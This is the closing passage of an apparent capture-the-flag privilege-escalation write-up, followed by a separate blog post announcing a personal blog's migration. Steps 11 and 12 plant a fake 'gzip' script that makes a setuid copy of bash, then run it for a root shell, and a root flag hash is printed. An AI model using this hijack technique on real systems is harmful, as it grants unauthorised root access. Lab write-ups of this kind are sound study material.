gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz

11- We can put a script named gzip in the current workdir and execute access_backup.sh as root.

cd /tmp
# set gzip to be bash with setuid bit
cat << EOF > gzip 
#!/bin/bash
cp /bin/bash /tmp/c
chmod u+s /tmp/c
EOF

12- Now /tmp/c is a setuid bash.

/tmp/c -p # this flag sets the real userid as the effective userid

root.txt: 23c44ab8465e7ff51a5fab75847e088b

item.title: Migration from previous blog
item.description: It’s been a while since I last wrote for my personal blog. Last year, while I was in 2nd year of Bachelor, I wrote more articles about Data Structures and Algorithms, and little things I found to be fancy about pentesting. After a year of self teaching and research, I’m now focusing more on reverse engineering, malware analysis and using data science for faster analysis. There are so many things that I want to know better, but I struggle because they are undocumented, and that’s why I decided to retake this.
item.content:
It’s been a while since I last wrote for my personal blog. Last year, while I was in 2nd year of Bachelor, I wrote more articles about Data Structures and Algorithms, and little things I found to be fancy about pentesting. After a year of self teaching and research, I’m now focusing more on reverse engineering, malware analysis and using data science for faster analysis. There are so many things that I want to know better, but I struggle because they are undocumented, and that’s why I decided to retake this. This blog is mainly for my own tracking but I hope it’s helpful for others and that I will update this more often!

The old blog is still stored at the master branch of RoundofThree/roundofthree.github.io.
